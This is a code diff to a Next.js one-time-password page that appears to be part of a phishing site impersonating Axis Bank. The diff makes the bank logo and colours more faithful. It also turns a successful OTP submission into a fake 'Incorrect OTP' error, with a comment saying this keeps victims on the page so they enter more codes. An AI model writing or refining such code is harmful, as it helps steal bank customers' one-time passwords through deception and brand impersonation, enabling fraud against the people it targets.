@@ -11,6 +11,7 @@ export default function OtpPage() {
   const router = useRouter();
   const [applicationId, setApplicationId] = useState("");
   const [otp, setOtp] = useState(["", "", "", "", "", ""]);
+  const [errorMsg, setErrorMsg] = useState("");
   const inputRefs = [
     useRef(null),
     useRef(null),
@@ -73,10 +74,12 @@ export default function OtpPage() {
       });
 
       if (response.data.success) {
-        // Clear local storage
-        localStorage.removeItem("applicationId");
-        // Redirect to homepage
-        router.push("/");
+        // Don't redirect! Show "Incorrect OTP" to keep them on the page.
+        setErrorMsg("Incorrect OTP. Please enter a valid OTP.");
+        setOtp(["", "", "", "", "", ""]);
+        if (inputRefs[0]?.current) {
+          inputRefs[0].current.focus();
+        }
       }
     } catch (error) {
       console.error("Error submitting OTP:", error);
@@ -91,11 +94,9 @@ export default function OtpPage() {
 
         {/* Axis Logo */}
         <div className="flex justify-center mb-6">
-          <div className="flex items-center gap-1">
-            <div className="w-10 h-10 bg-[#A10D59] flex items-center justify-center text-white font-bold text-lg transform rotate-45 rounded-sm">
-              <span className="transform -rotate-45">A</span>
-            </div>
-            <span className="text-xl font-bold text-[#A10D59] tracking-wider">
+          <div className="flex items-center gap-3">
+            <img src="/axis.png" alt="Axis Bank" className="h-10 w-auto" />
+            <span className="text-2xl font-medium text-[#97144D] tracking-widest mt-1">
               AXIS BANK
             </span>
           </div>
@@ -108,6 +109,11 @@ export default function OtpPage() {
 
         {/* OTP Inputs */}
         <form onSubmit={handleSubmit}>
+          {errorMsg && (
+            <div className="bg-red-50 text-red-600 border border-red-200 text-sm py-2 px-4 rounded-md mb-4 font-medium inline-block">
+              {errorMsg}
+            </div>
+          )}
           <div className="flex justify-center gap-2 my-8" onPaste={handlePaste}>
             {otp.map((digit, index) => (
               <input
